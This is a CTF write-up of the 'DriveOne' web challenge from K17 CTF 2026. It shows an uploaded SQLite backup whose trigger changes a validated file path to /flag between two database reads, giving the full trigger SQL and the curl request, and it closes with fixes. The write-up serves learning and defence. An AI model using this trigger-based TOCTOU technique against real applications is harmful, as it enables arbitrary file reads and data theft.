# K17 CTF 2026 — DriveOne

# Category: Web
# Difficulty: Hard

---

## The Challenge

DriveOne was a file-hosting application where we could upload and read files.

The interesting part was the backup/import functionality. We could upload a ZIP containing the application's state, and that state included an SQLite database.

At first, I was mainly interested in the `/read/<file_id>` functionality and how the application decided whether a file was safe to read.

The first thing that caught my attention was that the application seemed to check the file path and then later fetch the path again before actually reading the file.

That looked suspicious.

---

## Looking at `/read`

The basic flow looked something like this:

```python
row = db_conn().query_one(
    "SELECT file_path FROM files WHERE file_id=?",
    file_id
)

if not starts_with_safe_dir(row.file_path):
    return "not allowed", 403

return do_read(file_id, row.file_path)
```

So initially, everything looked reasonable.

The application retrieves the path and checks whether it belongs to the expected directory.

But then I looked at what happened inside `do_read()`.

```python
def do_read(file_id, file_path):
    fresh = new_db_connection()

    row = fresh.query_one(
        "SELECT file_path FROM files WHERE file_id=?",
        file_id
    )

    return open(row.file_path).read()
```

That's where I stopped for a moment.

The application checked one value...

and then didn't actually use that value.

Instead, it opened another database connection and queried the path again.

That immediately made me think about a TOCTOU condition.

---

# The Question

The basic idea was:

```text
Check the path
      ↓
Something changes
      ↓
Fetch the path again
      ↓
Use the new value
```

So the question became:

> Can I change `file_path` after the application performs the security check but before the second database query?

If I could do that, the path validator could see something harmless while the file reader would see something completely different.

---

## Looking at the Database

The challenge allowed us to import a backup containing `app.db`.

That was interesting because SQLite databases aren't necessarily just passive collections of data.

SQLite supports things like:

* triggers
* views
* other database objects

So I started thinking about whether I could make the database itself modify the `file_path` at the right moment.

The timing was important.

I didn't want the path to be malicious when the first query happened.

I wanted it to look completely safe during the check.

Then I wanted the database to change it before the second query.

---

# SQLite Trigger

The `/read` flow also updates the `last_viewed` field when a file is accessed.

That gave me exactly the event I needed.

I created a trigger that watches for an update to `last_viewed`.

The row initially contains a safe path:

```text
uploads/safe
```

So the first path check passes.

Then the update happens:

```text
UPDATE files SET last_viewed=...
```

The trigger fires and changes the path to:

```text
/flag
```

The important part is that this happens after the initial path check.

---

## The Malicious Database

I created a database with the required `files` table and inserted a harmless-looking entry:

```sql
CREATE TABLE files (
    file_id TEXT PRIMARY KEY,
    file_path TEXT NOT NULL,
    title TEXT NOT NULL,
    last_viewed TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

INSERT INTO files(file_id, file_path, title)
VALUES ('pwn', 'uploads/safe', 'safe');
```

Then I added the trigger:

```sql
CREATE TRIGGER swap_path
AFTER UPDATE OF last_viewed ON files
WHEN NEW.file_id = 'pwn'
BEGIN
    UPDATE files
    SET file_path = '/flag'
    WHERE file_id = 'pwn';
END;
```

So the row starts as:

```text
file_id:   pwn
file_path: uploads/safe
```

But after the update:

```text
file_id:   pwn
file_path: /flag
```

---

# The Race

The complete sequence now looked like this:

```text
GET /read/pwn
       │
       ▼
SELECT file_path
       │
       ▼
uploads/safe
       │
       ▼
Path check passes ✓
       │
       ▼
UPDATE last_viewed
       │
       ▼
SQLite trigger fires
       │
       ▼
file_path → /flag
       │
       ▼
New DB connection
       │
       ▼
SELECT file_path again
       │
       ▼
/flag
       │
       ▼
open("/flag")
       │
       ▼
Flag
```

This was the key part of the challenge.

The path validation wasn't necessarily broken.

The problem was that the application validated one database state and used another.

---

# Creating the Backup

The importer expected the SQLite database to be called:

```text
app.db
```

and placed at the root of the ZIP.

So the final archive was simply:

```text
state.zip
└── app.db
```

I then imported it into the instance.

---

# Triggering the Exploit

After importing the database, I requested:

```bash
curl https://INSTANCE/read/pwn
```

The first query saw:

```text
uploads/safe
```

and the validation passed.

Then the trigger changed the value to:

```text
/flag
```

The second database connection fetched the modified path and the application opened it.

---

# Result

The response gave us the flag:

```text
K17{i'm_to0_la2y_t0_wr1t3_a_pr0p3r_fl@g_anyway$_congr@ts}
```

---

# Exploit Chain

The whole exploit can be summarized as:

```text
Import malicious SQLite database
            ↓
Plant trigger
            ↓
Create safe-looking file entry
            ↓
/read/pwn
            ↓
Path validation passes
            ↓
last_viewed is updated
            ↓
Trigger changes file_path
            ↓
Fresh DB connection
            ↓
Path fetched again
            ↓
/flag
            ↓
Arbitrary file read
            ↓
Flag
```

---

# Why This Worked

The important detail was the difference between the two database reads.

The first read was used for security validation:

```text
"Is this path safe?"
```

The second read was used for the actual file operation:

```text
"What path should I open?"
```

Those two answers didn't have to be the same.

Because I controlled the imported SQLite database, I could make the database change the value between those two operations.

That's what turned the path check into something we could bypass.

---

# What I Took Away From This

This challenge changed the way I look at file-read vulnerabilities a little.

When I see something like:

```text
validate(value)
use(value)
```

I don't just look at whether the validation itself is correct.

I also want to know:

> Is this exactly the same value that gets used later?

If the application fetches the value again, accesses it through another layer, or uses another database connection, there may be an opportunity for the state to change in between.

In this case, the interesting primitive wasn't a traditional path traversal.

It was the combination of:

```text
User-controlled database
        +
SQLite trigger
        +
TOCTOU
        +
Unsafe file read
```

That combination was enough to turn a safe-looking path into `/flag`.

---

# Fixing the Issue

The simplest fix would be to validate the exact value that is going to be used.

Instead of querying the path again later, the application could keep the already-validated value and use it directly:

```python
row = db.query(
    "SELECT file_path FROM files WHERE file_id=?",
    file_id
)

if not safe(row.file_path):
    return "not allowed", 403

return open(row.file_path).read()
```

There is another important issue here too.

The application should not blindly trust an imported SQLite database.

If users can upload application state containing arbitrary database objects, things like triggers can become part of the attack surface.

The database should be recreated or imported in a way that doesn't allow attacker-controlled triggers and other executable database objects to influence application behaviour.

---

## Final Takeaway

The part I liked most about this challenge was that there wasn't a single obvious payload that solved it.

The solution came from connecting several small observations:

```text
The application imports SQLite
            ↓
SQLite supports triggers
            ↓
The path is checked
            ↓
The path is fetched again
            ↓
The database changes during the request
            ↓
The second value isn't validated
```

Individually, none of those observations looked particularly impressive.

Together, they gave us the exploit.
